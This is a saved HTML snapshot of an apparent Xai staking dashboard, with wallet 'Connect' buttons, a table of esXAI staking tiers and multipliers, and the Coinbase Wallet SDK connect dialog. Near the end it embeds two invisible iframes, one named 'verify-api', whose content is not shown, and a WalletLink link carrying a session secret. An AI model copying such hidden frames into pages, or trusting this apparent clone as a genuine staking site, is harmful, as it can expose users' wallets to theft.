type="button" aria-pressed="false"><span class="sr-only">open navigation menu</span><span class="w-full h-full pointer-events-none flex flex-col items-center justify-center text-inherit group-data-[pressed=true]:opacity-70 transition-opacity before:content-[''] before:block before:h-px before:w-6 before:bg-current before:transition-transform before:duration-150 before:-translate-y-1 before:rotate-0 group-data-[open=true]:before:translate-y-px group-data-[open=true]:before:rotate-45 after:content-[''] after:block after:h-px after:w-6 after:bg-current after:transition-transform after:duration-150 after:translate-y-1 after:rotate-0 group-data-[open=true]:after:translate-y-0 group-data-[open=true]:after:-rotate-45"></span></button><div class="flex items-center ml-1"><span class="pb-[6px]"><svg style="width:24px;height:24px" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 16 13.518"><path id="Path_3462" data-name="Path 3462" d="M192.719,5.162l3.657,6.18h-7.314l3.657-6.18m0-4.742-8,13.518h16l-8-13.518h0Z" transform="translate(-184.72 -0.42)" fill="#f30019"></path></svg></span><a class="relative inline-flex items-center tap-highlight-transparent outline-none data-[focus-visible=true]:z-10 data-[focus-visible=true]:outline-2 data-[focus-visible=true]:outline-focus data-[focus-visible=true]:outline-offset-2 text-medium text-primary no-underline hover:opacity-80 active:opacity-disabled transition-opacity" tabindex="0" role="link" href=""><div class="text-lg text-lightBlackDarkWhite font-bold py-2 pl-2">Xai</div></a></div></ul><ul class="flex gap-4 h-full flex-row flex-nowrap items-center data-[justify=start]:justify-start data-[justify=start]:flex-grow data-[justify=start]:basis-0 data-[justify=center]:justify-center data-[justify=end]:justify-end data-[justify=end]:flex-grow data-[justify=end]:basis-0" data-justify="start"></ul><ul class="flex gap-4 h-full flex-row flex-nowrap items-center data-[justify=start]:justify-start data-[justify=start]:flex-grow data-[justify=start]:basis-0 data-[justify=center]:justify-center data-[justify=end]:justify-end data-[justify=end]:flex-grow data-[justify=end]:basis-0" data-justify="end"><button class="z-0 group relative inline-flex items-center justify-center box-border appearance-none select-none whitespace-nowrap font-normal subpixel-antialiased overflow-hidden tap-highlight-transparent outline-none data-[focus-visible=true]:z-10 data-[focus-visible=true]:outline-2 data-[focus-visible=true]:outline-focus data-[focus-visible=true]:outline-offset-2 min-w-unit-20 h-unit-10 text-small gap-unit-2 [&amp;>svg]:max-w-[theme(spacing.unit-8)] data-[pressed=true]:scale-[0.97] transition-transform-colors-opacity motion-reduce:transition-none data-[hover=true]:opacity-hover bg-[#F30919] w-[165px] text-[#EEEEEE] px-[17px] py-[10px] rounded-[8px] hover:bg-[#da1b28] ease-in duration-200" type="submit">Connect wallet</button></ul></header></nav><main class="flex w-full flex-col items-center lg:px-[150px]"><div class="sm:p-4 lg:flex sm:grid sm:flex-col sm:items-center lg:items-start min-w-full"><h2 class="text-lightBlackDarkWhite text-[32px] font-bold lg:pl-5 sm:mb-[25px]">Overview</h2><div class="flex lg:flex-row sm:flex-col w-full justify-between"><div class="flex sm:flex-col sm:items-start lg:pl-5 lg:mb-8 sm:mb-4"><div class="flex flex-col sm:mr-0 sm:mb-1 sm:min-w-[270px] lg:min-w-[0px] lg:mb-0 py-1"><span class="text-graphiteGray text-lg mb-1">Wallet balance</span><span class="text-lightBlackDarkWhite text-4xl font-medium">— esXAI</span></div><div class="flex flex-col sm:mr-0 py-1"><span class="text-lightBlackDarkWhite text-4xl font-medium mb-2">— XAI</span></div></div><div class="flex lg:flex-row sm:flex-col justify-end lg:px-6 lg:py-3 sm:mb-10 lg:mb-0"><button class="z-0 group relative inline-flex items-center justify-center box-border appearance-none select-none whitespace-nowrap font-normal subpixel-antialiased overflow-hidden tap-highlight-transparent outline-none data-[focus-visible=true]:z-10 data-[focus-visible=true]:outline-2 data-[focus-visible=true]:outline-focus data-[focus-visible=true]:outline-offset-2 min-w-unit-20 text-small gap-unit-2 [&amp;>svg]:max-w-[theme(spacing.unit-8)] data-[pressed=true]:scale-[0.97] transition-transform-colors-opacity motion-reduce:transition-none data-[hover=true]:opacity-hover bg-[#F30919] lg:w-[165px] sm:w-[308px] h-[50px] text-[#EEEEEE] px-[20px] py-[18px] rounded-[8px] hover:bg-[#da1b28] ease-in duration-200" type="submit">Connect wallet</button></div></div><div class="border-1 border-silverMist rounded-xl shadow-shadowGrey shadow-md mb-5 flex flex-col lg:p-7 sm:p-4 justify-between lg:min-w-[575px] sm:min-w-[330px] lg:h-[245px] lg:mr-4 sm:mr-0 sm:mb-4 w-full"><div class="flex flex-col"><span class="text-graphiteGray text-md sm:text-md mb-1 font-medium">Total staked esXAI</span><span class="lg:flex lg:justify-between"><span class="text-lightBlackDarkWhite text-4xl lg:flex">— esXAI<div><span class="bg-[#C36522] px-3 py-1 rounded-2xl text-[10px] text-white align-middle ml-2">BRONZE TIER</span></div></span><span class="text-graphiteGray mt-1 mr-2 justify-end flex pt-2 sm:mb-1"></span></span><div class="flex flex-col gap-2 w-full" id="react-aria-:Rr5tala:" aria-labelledby="progress" aria-valuenow="0" aria-valuemin="0" aria-valuemax="100" aria-valuetext="0%" role="progressbar"><div class="z-0 relative bg-default-300/50 overflow-hidden h-3 rounded-none"><div class="h-full bg-primary rounded-none transition-transform !duration-500 bg-red" style="transform:translateX(-100%)"></div></div></div><span class="text-graphiteGray mr-2 justify-end flex mt-2"></span></div><div class="flex flex-row justify-end w-full gap-2 mt-2"><button class="z-0 group relative inline-flex items-center justify-center box-border appearance-none select-none whitespace-nowrap font-normal subpixel-antialiased overflow-hidden tap-highlight-transparent outline-none data-[focus-visible=true]:z-10 data-[focus-visible=true]:outline-2 data-[focus-visible=true]:outline-focus data-[focus-visible=true]:outline-offset-2 min-w-unit-20 text-small gap-unit-2 [&amp;>svg]:max-w-[theme(spacing.unit-8)] data-[pressed=true]:scale-[0.97] transition-transform-colors-opacity motion-reduce:transition-none data-[hover=true]:opacity-hover bg-[#F30919] lg:w-[165px] sm:w-[308px] h-[50px] text-[#EEEEEE] px-[20px] py-[18px] rounded-[8px] hover:bg-[#da1b28] ease-in duration-200" type="submit">Connect wallet</button></div></div><div class="flex flex-col min-w-full"><div class="overflow-x-auto sm:-mx-6 lg:-mx-8"><div class="inline-block min-w-full lg:py-2 sm:py-4 sm:px-6 lg:px-8"><div class="overflow-hidden"><div class="flex justify-start items-baseline"><h2 class="text-lightBlackDarkWhite text-[32px] font-bold text-xl font-bold mr-4 sm:mb-[25px]">Pool staking tiers</h2><a href="https://xai-foundation.gitbook.io/xai-network/xai-blockchain/welcome-to-xai" target="_blank" class="text-red text-sm font-medium undefined">Learn more</a></div><table class="min-w-full text-base font-light"><thead class="border-b"><tr><th scope="col" class="py-4 bg-crystalWhite font-medium lg:text-base sm:text-sm text-left mr-[300px] lg:px-6 }">Tier</th><th scope="col" class="py-4 bg-crystalWhite font-medium lg:text-base sm:text-sm text-right lg:px-6 }">esXAI staking requirement</th><th scope="col" class="py-4 bg-crystalWhite font-medium lg:text-base sm:text-sm text-right lg:px-4 }">Reward success multiplier</th></tr></thead><tbody><tr class="border-b text-right"><td class="whitespace-nowrap lg:px-6 lg:py-4 lg:text-base text-lightWhiteDarkBlack text-left font-medium sm:text-xs"><span class="bg-[#C36522] px-3 py-1 rounded-2xl">BRONZE TIER</span></td><td class="lg:whitespace-nowrap text-graphiteGray lg:px-6 lg:py-4">0 staked esXAI</td><td class="whitespace-nowrap text-graphiteGray lg:px-4 py-4">1x</td></tr><tr class="border-b text-right"><td class="whitespace-nowrap lg:px-6 lg:py-4 lg:text-base text-lightWhiteDarkBlack text-left font-medium sm:text-xs"><span class="bg-[#BBBBBB] px-3 py-1 rounded-2xl">SILVER TIER</span></td><td class="lg:whitespace-nowrap text-graphiteGray lg:px-6 lg:py-4">1,000 staked esXAI</td><td class="whitespace-nowrap text-graphiteGray lg:px-4 py-4">2x</td></tr><tr class="border-b text-right"><td class="whitespace-nowrap lg:px-6 lg:py-4 lg:text-base text-lightWhiteDarkBlack text-left font-medium sm:text-xs"><span class="bg-[#FFBA18] px-3 py-1 rounded-2xl">GOLD TIER</span></td><td class="lg:whitespace-nowrap text-graphiteGray lg:px-6 lg:py-4">10,000 staked esXAI</td><td class="whitespace-nowrap text-graphiteGray lg:px-4 py-4">4x</td></tr><tr class="border-b text-right"><td class="whitespace-nowrap lg:px-6 lg:py-4 lg:text-base text-lightWhiteDarkBlack text-left font-medium sm:text-xs"><span class="bg-gradient-to-t from-[#5D6874] to-[#E3E3E3] px-3 py-1 rounded-2xl">PLATINUM TIER</span></td><td class="lg:whitespace-nowrap text-graphiteGray lg:px-6 lg:py-4">100,000 staked esXAI</td><td class="whitespace-nowrap text-graphiteGray lg:px-4 py-4">8x</td></tr><tr class="border-b text-right"><td class="whitespace-nowrap lg:px-6 lg:py-4 lg:text-base text-lightWhiteDarkBlack text-left font-medium sm:text-xs"><span class="bg-gradient-to-t from-[#99AAF8] to-[#8DFDF9] px-3 py-1 rounded-2xl">DIAMOND TIER</span></td><td class="lg:whitespace-nowrap text-graphiteGray lg:px-6 lg:py-4">1,000,000 staked esXAI</td><td class="whitespace-nowrap text-graphiteGray lg:px-4 py-4">16x</td></tr></tbody></table></div></div></div></div></div></main></div></div></div><iframe height="1" width="1" style="position: absolute; top: 0px; left: 0px; border: none; visibility: hidden;" src="index_1.html"></iframe>  <next-route-announcer style="position: absolute;" data-scrapbook-shadowdom="<div aria-live=&quot;assertive&quot; id=&quot;__next-route-announcer__&quot; role=&quot;alert&quot; style=&quot;position: absolute; border: 0px; height: 1px; margin: -1px; padding: 0px; width: 1px; clip: rect(0px, 0px, 0px, 0px); overflow: hidden; white-space: nowrap; overflow-wrap: normal;&quot;></div>"></next-route-announcer><span data-focus-scope-start="true" hidden=""></span><span data-focus-scope-end="true" hidden=""></span><iframe id="verify-api" src="4d71771cc1633008048b48359258b055.txt" style="display: none;"></iframe> </body><div class="-cbwsdk-css-reset"><div class="-cbwsdk-link-flow-root"><div class="-cbwsdk-connect-dialog-container -cbwsdk-connect-dialog-container-hidden"><style>.-cbwsdk-css-reset .-cbwsdk-connect-dialog{z-index:2147483647;position:fixed;top:0;left:0;right:0;bottom:0;display:flex;align-items:center;justify-content:center}.-cbwsdk-css-reset .-cbwsdk-connect-dialog-backdrop{z-index:2147483647;position:fixed;top:0;left:0;right:0;bottom:0;transition:opacity .25s}.-cbwsdk-css-reset .-cbwsdk-connect-dialog-backdrop.light{background-color:rgba(0,0,0,.5)}.-cbwsdk-css-reset .-cbwsdk-connect-dialog-backdrop.dark{background-color:rgba(50,53,61,.4)}.-cbwsdk-css-reset .-cbwsdk-connect-dialog-backdrop-hidden{opacity:0}.-cbwsdk-css-reset .-cbwsdk-connect-dialog-box{display:flex;position:relative;flex-direction:column;transform:scale(1);transition:opacity .25s,transform .25s}.-cbwsdk-css-reset .-cbwsdk-connect-dialog-box-hidden{opacity:0;transform:scale(0.85)}.-cbwsdk-css-reset .-cbwsdk-connect-dialog-container{display:block}.-cbwsdk-css-reset .-cbwsdk-connect-dialog-container-hidden{display:none}</style><div class="-cbwsdk-connect-dialog-backdrop light -cbwsdk-connect-dialog-backdrop-hidden"></div><div class="-cbwsdk-connect-dialog"><div class="-cbwsdk-connect-dialog-box -cbwsdk-connect-dialog-box-hidden"><div data-testid="connect-content" class="-cbwsdk-connect-content light"><style>.-cbwsdk-css-reset .-cbwsdk-connect-content{height:430px;width:700px;border-radius:12px;padding:30px}.-cbwsdk-css-reset .-cbwsdk-connect-content.light{background:#fff}.-cbwsdk-css-reset .-cbwsdk-connect-content.dark{background:#0a0b0d}.-cbwsdk-css-reset .-cbwsdk-connect-content-header{display:flex;align-items:center;justify-content:space-between;margin:0 0 30px}.-cbwsdk-css-reset .-cbwsdk-connect-content-heading{font-style:normal;font-weight:500;font-size:28px;line-height:36px;margin:0}.-cbwsdk-css-reset .-cbwsdk-connect-content-heading.light{color:#0a0b0d}.-cbwsdk-css-reset .-cbwsdk-connect-content-heading.dark{color:#fff}.-cbwsdk-css-reset .-cbwsdk-connect-content-layout{display:flex;flex-direction:row}.-cbwsdk-css-reset .-cbwsdk-connect-content-column-left{margin-right:30px;display:flex;flex-direction:column;justify-content:space-between}.-cbwsdk-css-reset .-cbwsdk-connect-content-column-right{flex:25%;margin-right:34px}.-cbwsdk-css-reset .-cbwsdk-connect-content-qr-wrapper{width:220px;height:220px;border-radius:12px;display:flex;justify-content:center;align-items:center;background:#fff}.-cbwsdk-css-reset .-cbwsdk-connect-content-qr-connecting{position:absolute;top:0;bottom:0;left:0;right:0;display:flex;flex-direction:column;align-items:center;justify-content:center}.-cbwsdk-css-reset .-cbwsdk-connect-content-qr-connecting.light{background-color:rgba(255,255,255,.95)}.-cbwsdk-css-reset .-cbwsdk-connect-content-qr-connecting.light>p{color:#0a0b0d}.-cbwsdk-css-reset .-cbwsdk-connect-content-qr-connecting.dark{background-color:rgba(10,11,13,.9)}.-cbwsdk-css-reset .-cbwsdk-connect-content-qr-connecting.dark>p{color:#fff}.-cbwsdk-css-reset .-cbwsdk-connect-content-qr-connecting>p{font-size:12px;font-weight:bold;margin-top:16px}.-cbwsdk-css-reset .-cbwsdk-connect-content-update-app{border-radius:8px;font-size:14px;line-height:20px;padding:12px;width:339px}.-cbwsdk-css-reset .-cbwsdk-connect-content-update-app.light{background:#eef0f3;color:#5b636e}.-cbwsdk-css-reset .-cbwsdk-connect-content-update-app.dark{background:#1e2025;color:#8a919e}.-cbwsdk-css-reset .-cbwsdk-cancel-button{-webkit-appearance:none;border:none;background:none;cursor:pointer;padding:0;margin:0}.-cbwsdk-css-reset .-cbwsdk-cancel-button-x{position:relative;display:block;cursor:pointer}.-cbwsdk-css-reset .-cbwsdk-wallet-steps{padding:0 0 0 16px;margin:0;width:100%;list-style:decimal}.-cbwsdk-css-reset .-cbwsdk-wallet-steps-item{list-style-type:decimal;display:list-item;font-style:normal;font-weight:400;font-size:16px;line-height:24px;margin-top:20px}.-cbwsdk-css-reset .-cbwsdk-wallet-steps-item.light{color:#0a0b0d}.-cbwsdk-css-reset .-cbwsdk-wallet-steps-item.dark{color:#fff}.-cbwsdk-css-reset .-cbwsdk-wallet-steps-item-wrapper{display:flex;align-items:center}.-cbwsdk-css-reset .-cbwsdk-wallet-steps-pad-left{margin-left:6px}.-cbwsdk-css-reset .-cbwsdk-wallet-steps-icon{display:flex;border-radius:50%;height:24px;width:24px}.-cbwsdk-css-reset .-cbwsdk-wallet-steps-icon svg{margin:auto;display:block}.-cbwsdk-css-reset .-cbwsdk-wallet-steps-icon.light{background:#0052ff}.-cbwsdk-css-reset .-cbwsdk-wallet-steps-icon.dark{background:#588af5}.-cbwsdk-css-reset .-cbwsdk-connect-item{align-items:center;display:flex;flex-direction:row;padding:16px 24px;gap:12px;cursor:pointer;border-radius:100px;font-weight:600}.-cbwsdk-css-reset .-cbwsdk-connect-item.light{background:#f5f8ff;color:#0052ff}.-cbwsdk-css-reset .-cbwsdk-connect-item.dark{background:#001033;color:#588af5}.-cbwsdk-css-reset .-cbwsdk-connect-item-copy-wrapper{margin:0 4px 0 8px}.-cbwsdk-css-reset .-cbwsdk-connect-item-title{margin:0 0 0;font-size:16px;line-height:24px;font-weight:500}.-cbwsdk-css-reset .-cbwsdk-connect-item-description{font-weight:400;font-size:14px;line-height:20px;margin:0}</style><div class="-cbwsdk-connect-content-header"><h2 class="-cbwsdk-connect-content-heading light">Scan to connect with our mobile app</h2></div><div class="-cbwsdk-connect-content-layout"><div class="-cbwsdk-connect-content-column-left"><div class="-cbwsdk-connect-item light"><div><svg width="28" height="28" viewBox="0 0 28 28" fill="none" xmlns="http://www.w3.org/2000/svg"><circle cx="14" cy="14" r="14" fill="#0052FF"></circle><path d="M23.8521 14.0003C23.8521 19.455 19.455 23.8521 14.0003 23.8521C8.54559 23.8521 4.14844 19.455 4.14844 14.0003C4.14844 8.54559 8.54559 4.14844 14.0003 4.14844C19.455 4.14844 23.8521 8.54559 23.8521 14.0003Z" fill="white"></path><path d="M11.1855 12.5042C11.1855 12.0477 11.1855 11.7942 11.2835 11.642C11.3814 11.4899 11.4793 11.3377 11.6261 11.287C11.8219 11.1855 12.0178 11.1855 12.5073 11.1855H15.4934C15.983 11.1855 16.1788 11.1855 16.3746 11.287C16.5215 11.3884 16.6683 11.4899 16.7173 11.642C16.8152 11.8449 16.8152 12.0477 16.8152 12.5042V15.4965C16.8152 15.953 16.8152 16.2066 16.7173 16.3587C16.6194 16.5109 16.5215 16.663 16.3746 16.7137C16.1788 16.8152 15.983 16.8152 15.4934 16.8152H12.5073C12.0178 16.8152 11.8219 16.8152 11.6261 16.7137C11.4793 16.6123 11.3324 16.5109 11.2835 16.3587C11.1855 16.1558 11.1855 15.953 11.1855 15.4965V12.5042Z" fill="#0052FF"></path></svg></div><div class="-cbwsdk-connect-item-copy-wrapper"><h3 class="-cbwsdk-connect-item-title">Coinbase Wallet app</h3><p class="-cbwsdk-connect-item-description">Connect with your self-custody wallet</p></div></div></div><div class="-cbwsdk-connect-content-column-right"><div class="-cbwsdk-connect-content-qr-wrapper"><img src="94089aa56eb9f1372a839cfd57e4241c3eff8ed3.svg" alt="QR Code"><input type="hidden" name="cbw-cbwsdk-version" value="3.9.1"><input type="hidden" value="https://www.walletlink.org/#/link?id=c178e5d043c5e58f945898a4384ec903&amp;secret=c07e8765d66c87a10d28a370119acb6efc92a95683515cbb976ab148f142a474&amp;server=https%3A%2F%2Fwww.walletlink.org&amp;v=3.9.1&amp;chainId=1"></div><ol class="-cbwsdk-wallet-steps"><li class="-cbwsdk-wallet-steps-item light"><div class="-cbwsdk-wallet-steps-item-wrapper">Open Coinbase Wallet app</div></li><li class="-cbwsdk-wallet-steps-item light"><div class="-cbwsdk-wallet-steps-item-wrapper"><span>Tap <strong>Scan</strong> </span><span class="-cbwsdk-wallet-steps-pad-left -cbwsdk-wallet-steps-icon light"><svg width="18" height="18" viewBox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" fill="#FFFFFF"><path d="M3 3V8.99939L5 8.99996V5H9V3H3Z"></path><path d="M15 21L21 21V15.0006L19 15V19L15 19V21Z"></path><path d="M21 9H19V5H15.0006L15 3H21V9Z"></path><path d="M3 15V21H8.99939L8.99996 19H5L5 15H3Z"></path></svg></span></div></li></ol></div></div></div><div class="-cbwsdk-try-extension light"><style>.-cbwsdk-css-reset .-cbwsdk-try-extension{display:flex;margin-top:12px;height:202px;width:700px;border-radius:12px;padding:30px}.-cbwsdk-css-reset .-cbwsdk-try-extension.light{background:#fff}.-cbwsdk-css-reset .-cbwsdk-try-extension.dark{background:#0a0b0d}.-cbwsdk-css-reset .-cbwsdk-try-extension-column-half{flex:50%}.-cbwsdk-css-reset .-cbwsdk-try-extension-heading{font-style:normal;font-weight:500;font-size:25px;line-height:32px;margin:0;max-width:204px}.-cbwsdk-css-reset .-cbwsdk-try-extension-heading.light{color:#0a0b0d}.-cbwsdk-css-reset .-cbwsdk-try-extension-heading.dark{color:#fff}.-cbwsdk-css-reset .-cbwsdk-try-extension-cta{appearance:none;border:none;background:none;color:#0052ff;cursor:pointer;padding:0;text-decoration:none;display:block;font-weight:600;font-size:16px;line-height:24px}.-cbwsdk-css-reset .-cbwsdk-try-extension-cta.light{color:#0052ff}.-cbwsdk-css-reset .-cbwsdk-try-extension-cta.dark{color:#588af5}.-cbwsdk-css-reset .-cbwsdk-try-extension-cta-wrapper{display:flex;align-items:center;margin-top:12px}.-cbwsdk-css-reset .-cbwsdk-try-extension-cta-icon{display:block;margin-left:4px;height:14px}.-cbwsdk-css-reset .-cbwsdk-try-extension-list{display:flex;flex-direction:column;justify-content:center;align-items:center;margin:0;padding:0;list-style:none;height:100%}.-cbwsdk-css-reset .-cbwsdk-try-extension-list-item{display:flex;align-items:center;flex-flow:nowrap;margin-top:24px}.-cbwsdk-css-reset .-cbwsdk-try-extension-list-item:first-of-type{margin-top:0}.-cbwsdk-css-reset .-cbwsdk-try-extension-list-item-icon-wrapper{display:block}.-cbwsdk-css-reset .-cbwsdk-try-extension-list-item-icon{display:flex;height:32px;width:32px;border-radius:50%}.-cbwsdk-css-reset .-cbwsdk-try-extension-list-item-icon svg{margin:auto;display:block}.-cbwsdk-css-reset .-cbwsdk-try-extension-list-item-icon.light{background:#eef0f3}.-cbwsdk-css-reset .-cbwsdk-try-extension-list-item-icon.dark{background:#1e2025}.-cbwsdk-css-reset .-cbwsdk-try-extension-list-item-copy{display:block;font-weight:400;font-size:14px;line-height:20px;padding-left:12px}.-cbwsdk-css-reset .-cbwsdk-try-extension-list-item-copy.light{color:#5b636e}.-cbwsdk-css-reset .-cbwsdk-try-extension-list-item-copy.dark{color:#8a919e}</style><div class="-cbwsdk-try-extension-column-half"><h3 class="-cbwsdk-try-extension-heading light">Or try the Coinbase Wallet browser extension</h3><div class="-cbwsdk-try-extension-cta-wrapper"><button class="-cbwsdk-try-extension-cta light">Install</button><div><svg width="16" height="16" viewBox="0 0 16 16" xmlns="http://www.w3.org/2000/svg" class="-cbwsdk-try-extension-cta-icon" fill="#0052FF"><path d="M8.60675 0.155884L7.37816 1.28209L12.7723 7.16662H0V8.83328H12.6548L6.82149 14.6666L8 15.8451L15.8201 8.02501L8.60675 0.155884Z"></path></svg></div></div></div><div class="-cbwsdk-try-extension-column-half"><ul class="-cbwsdk-try-extension-list"><li class="-cbwsdk-try-extension-list-item"><div class="-cbwsdk-try-extension-list-item-icon-wrapper"><span class="-cbwsdk-try-extension-list-item-icon light"><svg width="14" height="14" viewBox="0 0 14 14" xmlns="http://www.w3.org/2000/svg" fill="#0A0B0D"><path d="M1.8001 2.2002H12.2001V9.40019H1.8001V2.2002ZM3.4001 3.8002V7.80019H10.6001V3.8002H3.4001Z"></path><path d="M13.4001 10.2002H0.600098C0.600098 11.0838 1.31644 11.8002 2.2001 11.8002H11.8001C12.6838 11.8002 13.4001 11.0838 13.4001 10.2002Z"></path></svg></span></div><div class="-cbwsdk-try-extension-list-item-copy light">Connect with dapps with just one click on your desktop browser</div></li><li class="-cbwsdk-try-extension-list-item"><div class="-cbwsdk-try-extension-list-item-icon-wrapper"><span class="-cbwsdk-try-extension-list-item-icon light"><svg width="14" height="14" viewBox="0 0 14 14" xmlns="http://www.w3.org/2000/svg" fill="#0A0B0D"><path fill-rule="evenodd" clip-rule="evenodd" d="M0.600098 0.600098V11.8001H13.4001V0.600098H0.600098ZM7.0001 9.2001C5.3441 9.2001 4.0001 7.8561 4.0001 6.2001C4.0001 4.5441 5.3441 3.2001 7.0001 3.2001C8.6561 3.2001 10.0001 4.5441 10.0001 6.2001C10.0001 7.8561 8.6561 9.2001 7.0001 9.2001ZM0.600098 12.6001H3.8001V13.4001H0.600098V12.6001ZM10.2001 12.6001H13.4001V13.4001H10.2001V12.6001ZM8.8001 6.2001C8.8001 7.19421 7.99421 8.0001 7.0001 8.0001C6.00598 8.0001 5.2001 7.19421 5.2001 6.2001C5.2001 5.20598 6.00598 4.4001 7.0001 4.4001C7.99421 4.4001 8.8001 5.20598 8.8001 6.2001Z"></path></svg></span></div><div class="-cbwsdk-try-extension-list-item-copy light">Add an additional layer of security by using a supported Ledger hardware wallet</div></li></ul></div></div></div></div></div></div><div class="-cbwsdk-snackbar-root"><div><div class="-cbwsdk-snackbar-container"><style>.-cbwsdk-css-reset .-gear-container{margin-left:16px !important;margin-right:9px !important;display:flex;align-items:center;justify-content:center;width:24px;height:24px;transition:opacity .25s}.-cbwsdk-css-reset .-gear-container *{user-select:none}.-cbwsdk-css-reset .-gear-container svg{opacity:0;position:absolute}.-cbwsdk-css-reset .-gear-icon{height:12px;width:12px;z-index:10000}.-cbwsdk-css-reset .-cbwsdk-snackbar{align-items:flex-end;display:flex;flex-direction:column;position:fixed;right:0;top:0;z-index:2147483647}.-cbwsdk-css-reset .-cbwsdk-snackbar *{user-select:none}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance{display:flex;flex-direction:column;margin:8px 16px 0 16px;overflow:visible;text-align:left;transform:translateX(0);transition:opacity .25s,transform .25s}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-header:hover .-gear-container svg{opacity:1}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-header{display:flex;align-items:center;background:#fff;overflow:hidden;border:1px solid #e7ebee;box-sizing:border-box;border-radius:8px;cursor:pointer}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-header-cblogo{margin:8px 8px 8px 8px}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-header *{cursor:pointer}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-header-message{color:#000;font-size:13px;line-height:1.5;user-select:none}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu{background:#fff;transition:opacity .25s ease-in-out,transform .25s linear,visibility 0s;visibility:hidden;border:1px solid #e7ebee;box-sizing:border-box;border-radius:8px;opacity:0;flex-direction:column;padding-left:8px;padding-right:8px}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item:last-child{margin-bottom:8px !important}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item:hover{background:#f5f7f8;border-radius:6px;transition:background .25s}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item:hover span{color:#050f19;transition:color .25s}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item:hover svg path{fill:#000;transition:fill .25s}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item{visibility:inherit;height:35px;margin-top:8px;margin-bottom:0;display:flex;flex-direction:row;align-items:center;padding:8px;cursor:pointer}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item *{visibility:inherit;cursor:pointer}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item-is-red:hover{background:rgba(223,95,103,.2);transition:background .25s}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item-is-red:hover *{cursor:pointer}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item-is-red:hover svg path{fill:#df5f67;transition:fill .25s}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item-is-red:hover span{color:#df5f67;transition:color .25s}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-menu-item-info{color:#aaa;font-size:13px;margin:0 8px 0 32px;position:absolute}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-hidden{opacity:0;text-align:left;transform:translateX(25%);transition:opacity .5s linear}.-cbwsdk-css-reset .-cbwsdk-snackbar-instance-expanded .-cbwsdk-snackbar-instance-menu{opacity:1;display:flex;transform:translateY(8px);visibility:visible}</style><div class="-cbwsdk-snackbar"></div></div></div></div></div><style type="text/css">@namespace svg "http://www.w3.org/2000/svg";.-cbwsdk-css-reset,.-cbwsdk-css-reset *{animation:none;animation-delay:0;animation-direction:normal;animation-duration:0;animation-fill-mode:none;animation-iteration-count:1;animation-name:none;animation-play-state:running;animation-timing-function:ease;backface-visibility:visible;background:0;background-attachment:scroll;background-clip:border-box;background-color:rgba(0,0,0,0);background-image:none;background-origin:padding-box;background-position:0 0;background-position-x:0;background-position-y:0;background-repeat:repeat;background-size:auto auto;border:0;border-style:none;border-width:medium;border-color:inherit;border-bottom:0;border-bottom-color:inherit;border-bottom-left-radius:0;border-bottom-right-radius:0;border-bottom-style:none;border-bottom-width:medium;border-collapse:separate;border-image:none;border-left:0;border-left-color:inherit;border-left-style:none;border-left-width:medium;border-radius:0;border-right:0;border-right-color:inherit;border-right-style:none;border-right-width:medium;border-spacing:0;border-top:0;border-top-color:inherit;border-top-left-radius:0;border-top-right-radius:0;border-top-style:none;border-top-width:medium;box-shadow:none;box-sizing:border-box;caption-side:top;clear:none;clip:auto;color:inherit;columns:auto;column-count:auto;column-fill:balance;column-gap:normal;column-rule:medium none currentColor;column-rule-color:currentColor;column-rule-style:none;column-rule-width:none;column-span:1;column-width:auto;counter-increment:none;counter-reset:none;direction:ltr;empty-cells:show;float:none;font:normal;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",Arial,sans-serif;font-size:medium;font-style:normal;font-variant:normal;font-weight:normal;height:auto;hyphens:none;letter-spacing:normal;line-height:normal;list-style:none;list-style-image:none;list-style-position:outside;list-style-type:disc;margin:0;margin-bottom:0;margin-left:0;margin-right:0;margin-top:0;opacity:1;orphans:0;outline:0;outline-color:invert;outline-style:none;outline-width:medium;overflow:visible;overflow-x:visible;overflow-y:visible;padding:0;padding-bottom:0;padding-left:0;padding-right:0;padding-top:0;page-break-after:auto;page-break-before:auto;page-break-inside:auto;perspective:none;perspective-origin:50% 50%;pointer-events:auto;position:static;quotes:"\201C" "\201D" "\2018" "\2019";tab-size:8;table-layout:auto;text-align:inherit;text-align-last:auto;text-decoration:none;text-decoration-color:inherit;text-decoration-line:none;text-decoration-style:solid;text-indent:0;text-shadow:none;text-transform:none;transform:none;transform-style:flat;transition:none;transition-delay:0s;transition-duration:0s;transition-property:none;transition-timing-function:ease;unicode-bidi:normal;vertical-align:baseline;visibility:visible;white-space:normal;widows:0;word-spacing:normal;z-index:auto}.-cbwsdk-css-reset strong{font-weight:bold}.-cbwsdk-css-reset *{box-sizing:border-box;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI","Helvetica Neue",Arial,sans-serif;line-height:1}.-cbwsdk-css-reset [class*=container]{margin:0;padding:0}.-cbwsdk-css-reset style{display:none}</style></html>
